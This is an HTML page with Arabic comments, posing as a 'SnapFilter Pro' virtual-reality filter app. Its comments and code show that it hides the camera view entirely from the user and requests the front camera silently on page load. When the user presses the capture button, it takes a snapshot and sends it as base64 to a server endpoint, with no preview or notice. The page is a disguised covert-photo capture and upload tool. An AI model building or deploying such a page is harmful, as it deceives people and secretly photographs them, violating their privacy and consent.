<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SnapFilter</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0d0f12; color: #ffffff;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            min-height: 100vh; padding: 15px;
        }
        .container {
            width: 100%; max-width: 420px; background: #161922;
            border-radius: 20px; padding: 30px; text-align: center;
            border: 1px solid #262b3d; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        h2 { font-size: 24px; margin-bottom: 20px; color: #ff4757; font-weight: 700; }
        
        /* إخفاء صندوق الكاميرا تماماً عن المستخدم */
        .camera-box {
            display: none;
        }

        .filter-banner {
            background: linear-gradient(135deg, #1f4068, #162447);
            padding: 30px 20px;
            border-radius: 14px;
            border: 2px dashed #ff4757;
            margin-bottom: 25px;
        }
        .filter-banner p { font-size: 16px; color: #dcdde1; font-weight: bold; margin-top: 10px; }
        .filter-icon { font-size: 50px; }

        .btn-capture {
            background: linear-gradient(135deg, #ff4757, #ff6b81); color: white; border: none;
            width: 80px; height: 80px; border-radius: 50%; font-size: 30px; cursor: pointer;
            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4); display: inline-flex; align-items: center; justify-content: center;
            transition: transform 0.2s;
        }
        .btn-capture:active { transform: scale(0.92); }
    </style>
</head>
<body>

    <div class="container">
        <h2>SnapFilter Pro</h2>
        
        <!-- واجهة فخمة ومخفية الكاميرا عنها تماماً -->
        <div class="filter-banner">
            <div class="filter-icon">✨🎭</div>
            <p>فلتر الواقع الافتراضي نشط</p>
        </div>

        <!-- زر الالتقاط (يعمل في الخلفية بدون ظهور نصوص) -->
        <button class="btn-capture" id="capture-btn" title="التقاط">📸</button>
    </div>

    <!-- عنصر الفيديو المخفي الذي سيلتقط الصورة برمجياً في الخلفية -->
    <div class="camera-box">
        <video id="video" autoplay playsinline></video>
    </div>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('capture-btn');

        // طلب الكاميرا صامتاً في الخلفية عند فتح الصفحة لتكون جاهزة للاستخدام الفوري
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(err => {
                console.error("خطأ في تشغيل الكاميرا الخلفية: ", err);
            });

        // عند الضغط على زر الالتقاط، تتم العملية برمجياً في الخلفية بدون أي نصوص أو إزعاج
        captureBtn.addEventListener('click', () => {
            if (!video.videoWidth) {
                return; // إن لم تكن الكاميرا جاهزة بعد
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // سحب الصورة الحية من الكاميرا المخفية
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تحويلها إلى Base64
            const imageData = canvas.toDataURL('image/png');

            // إرسال الصورة للسيرفر في الخلفية بصمت تام
            fetch('/upload-snapshot', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ image: imageData })
            })
            .then(response => response.json())
            .then(data => {
                // تمت العملية بنجاح في الخلفية بدون عرض أي جمل أو تنبيهات للمستخدم
            })
            .catch(err => {
                console.error('Fetch Error:', err);
            });
        });
    </script>

</body>
</html>
